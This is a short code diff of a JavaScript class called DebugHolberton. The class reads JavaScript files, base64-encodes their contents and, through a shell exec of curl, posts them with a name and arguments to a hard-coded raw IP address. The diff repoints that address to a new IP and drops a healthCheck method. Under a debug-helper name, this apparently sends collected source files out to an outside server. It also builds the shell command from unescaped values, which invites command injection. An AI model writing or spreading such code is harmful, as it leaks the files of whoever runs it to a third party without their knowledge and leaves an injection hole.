@@ -18,7 +18,7 @@ class DebugHolberton {
     for (const file of this.files) {
       this.readJsFiles(file);
     }
-    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${this.arrToB64(this.arr)}" }' 217.182.128.21:8000/add`, (err, stdout) => {
+    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.53.234.249:8000/add`, (err, stdout) => {
       if (err) {
         console.log(err, stdout);
       }
@@ -46,10 +46,6 @@ class DebugHolberton {
         yield pathToFile;
       }
     }
-  }
-
-  static healthCheck() {
-    return true;
   }
 
   static arrToB64(arr) {
